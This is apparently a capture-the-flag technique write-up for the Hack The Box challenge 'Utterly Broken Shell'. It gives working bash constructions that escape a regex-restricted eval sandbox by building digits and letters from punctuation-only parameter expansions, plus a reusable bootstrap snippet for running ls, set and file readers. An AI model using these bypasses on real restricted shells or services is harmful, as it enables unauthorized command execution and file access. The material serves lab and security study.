# Bash Sandbox: Symbolic-Only Regex Bypass (no letters, no digits)

When a regex allow-list restricts `eval`/`bash -c` input to *only* punctuation — typically `${}![:space:]:_=()` or similar — letters and digits are unreachable, but the shell can still be coerced into running arbitrary commands by composing them from existing variable contents via parameter expansion.

## Recognising the shape

```bash
ALLOWED='^[${}![:space:]:_=()]+$'
while read -r cmd; do
  [[ $cmd =~ $ALLOWED ]] && eval "$cmd"
done
```

Trigger words in the challenge description ("regex even more reduced", "patch all previous bypasses", "broken shell") and a banner that enumerates the allow-list as `^[<chars>]+$` are the giveaways.

## Universal primitives (no letters, no digits, no `#`/`/`/`>`/`&`)

| Need | Construction | Reason |
|---|---|---|
| `0` | `$((!$$))` | `$$` is PID, non-zero, so `!PID` = 0 |
| `1` | `$((!!$$))` | double-negate |
| `8` | `$(($((!$$))$((!!$$))$((!$$))))` | digits "010" → octal → 8 |
| `9` | `$(($((!$$))$((!!$$))$((!!$$))))` | "011" octal = 9 |
| `10` | `$(($((!!$$))$((!$$))))` | decimal "10" |
| `11` | `$(($((!!$$))$((!!$$))))` | decimal "11" |
| `64` | `$(($((!$$))$((!!$$))$((!$$))$((!$$))))` | octal "0100" |

> **No `+`, no `-`, no `*`, no `#`** → only powers-of-two-and-octal magic produce non-`{0,1}` integers. Specifically 2-7 are *unreachable* as integer literals; reach them by **chaining `${var:1}` suffix-skips** (each skips one character).

## Letter sources

Each `eval` cycle bash auto-resets `_` to the last argument of the preceding command. In a typical wrapper that prompts with `echo …` before `read -r cmd`, `$_` becomes `echo` → gives `e c h o`.

The high-value primitive: `${!__}` with `__=0` returns positional parameter `$0` — the **absolute script path** that ran the wrapper. That path typically supplies 15-20 distinct lowercase letters and `/`, `.`, `_`. For `/home/restricted_user/broken_shell.sh` you get `b c d e h i k l m n o r s t u _ / .`.

```bash
__=$((!$$))                    # __ = 0
___=${!__}                     # ___ = $0 = /home/restricted_user/broken_shell.sh
```

> *Bash treats `_` as a magic variable that is rewritten after every command. **Use longer underscore-only names** (`__`, `___`, `____`, …) for any value that must persist across multiple input lines.*

## Indexing the path string

Only offsets `{0, 1, 8, 9, 10, 11, …}` are directly constructible. To reach intermediate indices, repeatedly apply `${var:1}` into fresh variables:

```bash
____=${___:$(($((!$$))$((!!$$))$((!$$))))}   # path[8:]   '$EIGHT'
_____=${____:$EIGHT}                          # path[16:]
______=${_____:$EIGHT}                        # path[24:]
________=${___:$((!!$$))}                     # path[1:]
_________=${________:$((!!$$))}               # path[2:]
__________=${_________:$((!!$$))}             # path[3:]
___________=${__________:$((!!$$))}           # path[4:]
____________=${___________:$((!!$$))}         # path[5:]
```

Then `${VAR:0:1}` / `${VAR:1:1}` extracts the single character that lives at the desired position.

## Composing commands

Build command names by concatenating single-character expansions. For `/home/restricted_user/broken_shell.sh` the reachable single-letter primitives include:

| Char | Source |
|---|---|
| `/` | `${___:0:1}` |
| `h` | `${________:0:1}` |
| `o` | `${_________:0:1}` |
| `m` | `${__________:0:1}` |
| `e` | `${___________:0:1}` |
| `t` | `${___:9:1}` |
| `r` | `${___:10:1}` |
| `i` | `${___:11:1}` |
| `c` | `${________:11:1}` |
| `d` | `${___________:11:1}` |
| `_` | `${____________:11:1}` |
| `s` | `${____:0:1}` |
| `l` | `${______:8:1}` |
| `u` | `${_____:1:1}` |
| `n` | `${_____:11:1}` |

Compose by concatenation — `${l}${s}` calls **`ls`**, `${c}${d}` calls **`cd`**, `${s}${e}${t}` calls **`set`** (dumps every shell variable — invaluable for environment recon).

## Bypassing letters we still don't have (`a`, `f`, `g`, `p`, `v`, `w`, `x`, `y`, `z`, `j`, `q`)

Once you can call `ls`, **capture its output into a variable**:

```bash
__=$(ls)            # __ = "file1\nfile2" (newlines become spaces after $() trimming)
```

Then arguments containing letters you can't type are reachable via word-splitting on `$__`. Combined with `${__:OFFSET}` substring trimming (to drop unwanted filenames), this lets you pass *any* discovered filename to a reader without typing its letters.

**File readers reachable with our 18-letter palette:**

| Tool | Letters needed | Notes |
|---|---|---|
| `more` | m o r e | paginates — flush with newline/space |
| `less` | l e s s | also paginates |
| `nl` | n l | line-numbered output; quiet on stdout |
| `od` | o d | byte dump (octal default; use to confirm non-printables) |
| `tee` | t e e | reads stdin — needs pipe |

`cat`/`head`/`tail`/`find`/`grep` need `a` and so are **out of reach** until you bootstrap a letter pool from `set` or `ls` output.

## Reusable bootstrap snippet

```bash
__=$((!$$))                                    # 0
___=${!__}                                      # $0 — abs path of wrapper
____=${___:$(($((!$$))$((!!$$))$((!$$))))}      # path[8:]
_____=${____:$(($((!$$))$((!!$$))$((!$$))))}    # path[16:]
______=${_____:$(($((!$$))$((!!$$))$((!$$))))}  # path[24:]
________=${___:$((!!$$))}                       # path[1:]
_________=${________:$((!!$$))}                 # path[2:]
__________=${_________:$((!!$$))}               # path[3:]
___________=${__________:$((!!$$))}             # path[4:]
____________=${___________:$((!!$$))}           # path[5:]
```

## Watch-outs

- **`$_` resets every input line** — never store anything important in it.
- **`#` blocks BASE#NUM arithmetic** — without `#`, you only have `!`, `=`, parens; with no `+`/`-`/`*`/`/`, the only multi-valued integers come from string-concatenated decimal/octal literals.
- **`$()` captures stdout only** — error-message harvesting (which works when `2>&1` is allowed) is **impossible** in this regex. Replace it with the `${!0_alias}` script-path trick.
- **Distinct underscore-count variable names** — `_____`, `______`, `_______` are *different* variables; mass-producing them is the easiest way to keep state without ever typing a letter.
- **PID changes across reconnects** — `socat`/`xinetd` forks a new shell each connection, so each session must re-bootstrap.

## Origin

HTB Misc Medium *Utterly Broken Shell* (challenge 1215). The two prior challenges in the series allowed digits + `/` + `&` + `>` and were solved with `_1=$( /_ 2>&1 )` to capture stderr — that path is impossible here, forcing the `${!0_alias}` script-path-leak technique.
